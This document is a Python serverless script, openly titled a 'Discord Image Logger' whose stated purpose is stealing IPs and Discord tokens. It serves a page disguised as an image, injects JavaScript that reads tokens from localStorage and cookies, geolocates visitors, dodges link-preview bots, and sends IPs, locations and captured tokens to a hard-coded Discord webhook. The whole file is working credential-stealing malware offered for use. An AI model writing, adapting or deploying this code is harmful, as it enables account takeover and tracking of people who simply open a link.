from urllib import parse
import traceback, requests, base64, httpagentparser, os

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and Discord tokens"
__version__ = "v3.0"
__author__ = "C00lB0i"

config = {
    "webhook": os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"),
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "tokenLogging": True,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return False
    if ip.startswith(("34", "35")) or "Discordbot" in useragent:
        return "Discord"
    elif "TelegramBot" in useragent:
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred!\n\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"Image Logging link sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                }, timeout=5)
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                if not info.get("proxy", False):
                    return
            elif config["antiBot"] == 3:
                return
            elif config["antiBot"] == 2:
                if not info.get("proxy", False):
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""
    except:
        info = {}
    
    os_name, browser = "Unknown", "Unknown"
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    description = f"""**User Opened Image!**

**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Provider:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords}`
**VPN:** `{info.get('proxy', 'Unknown')}`
**OS:** `{os_name}`
**Browser:** `{browser}`"""
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
            }
        ],
    }
    
    if url: 
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(f"Webhook Error: {str(e)}")
    
    return info

def reportToken(ip, useragent, token, endpoint="N/A"):
    if not token or token == "NOT_FOUND":
        return
    
    token_embed = {
        "username": "TOKEN LOGGER",
        "content": "@everyone **CRITICAL TOKEN CAPTURED**",
        "embeds": [
            {
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "description": f"""**Discord token captured!**

**IP:** `{ip}`
**Token:** `{token}`

**Handle with extreme care! This provides full account access!**""",
            }
        ],
    }
    
    try:
        requests.post(config["webhook"], json=token_embed, timeout=5)
    except Exception as e:
        reportError(f"Token Webhook Error: {str(e)}")

# Token capture JavaScript
token_js = """
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        let token = "NOT_FOUND";
        
        // Check localStorage
        const tokenKeys = ['token', '_token', 'discord_token', 'auth_token'];
        for (const key of tokenKeys) {
            const value = localStorage.getItem(key);
            if (value) {
                token = value;
                break;
            }
        }
        
        // Check cookies if not found
        if (token === "NOT_FOUND") {
            const cookies = document.cookie.split(';');
            for (const cookie of cookies) {
                const trimmed = cookie.trim();
                if (trimmed.startsWith('token=') || 
                    trimmed.startsWith('_token=') || 
                    trimmed.startsWith('discord_token=') || 
                    trimmed.startsWith('auth_token=')) {
                    token = trimmed.split('=')[1];
                    break;
                }
            }
        }
        
        // Send token to server
        const img = new Image();
        img.src = '/logtoken?token=' + encodeURIComponent(token);
    }, 1000);
});
"""

def handler(event, context):
    try:
        method = event['httpMethod']
        path = event['path']
        headers = event.get('headers', {})
        query = event.get('queryStringParameters', {})
        
        # Handle token.js request
        if path == '/token.js':
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/javascript'},
                'body': token_js
            }
            
        # Handle token logging
        if path == '/logtoken':
            ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
            useragent = headers.get('user-agent', 'Unknown')
            token = query.get('token', '')
            
            if token:
                reportToken(ip, useragent, token, path)
            
            # Return transparent pixel
            pixel = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'image/png'},
                'body': pixel,
                'isBase64Encoded': True
            }
        
        # Main image handling
        url = config["image"]
        if config["imageArgument"]:
            if 'url' in query:
                try:
                    url = base64.b64decode(query['url']).decode()
                except:
                    pass
            elif 'id' in query:
                try:
                    url = base64.b64decode(query['id']).decode()
                except:
                    pass
        
        # Build HTML content
        html_content = f'''<html>
<head>
<style>
body {{
    margin: 0;
    padding: 0;
    background-color: #1e1e1e;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
</head>
<body>
<div class="img"></div>
'''
        
        # Add token capture if enabled
        if config["tokenLogging"]:
            html_content += '<script src="/token.js"></script>'
        
        # Get client IP
        ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
        useragent = headers.get('user-agent', 'Unknown')
        
        # Skip blacklisted IPs
        if not ip.startswith(blacklistedIPs):
            # Bot handling
            bot = botCheck(ip, useragent)
            if bot:
                if config["buggedImage"]:
                    # Create bugged image response
                    loading_img = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                    return {
                        'statusCode': 200,
                        'headers': {'Content-Type': 'image/jpeg'},
                        'body': base64.b64encode(loading_img).decode(),
                        'isBase64Encoded': True
                    }
                else:
                    # Redirect to image
                    return {
                        'statusCode': 302,
                        'headers': {'Location': url}
                    }
            
            # Create report
            makeReport(ip, useragent, endpoint=path, url=url)
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html_content + '</body></html>'
        }
    
    except Exception as e:
        error_trace = traceback.format_exc()
        reportError(f"Handler Error: {str(e)}\n{error_trace}")
        return {
            'statusCode': 500,
            'body': 'Server Error'
        }
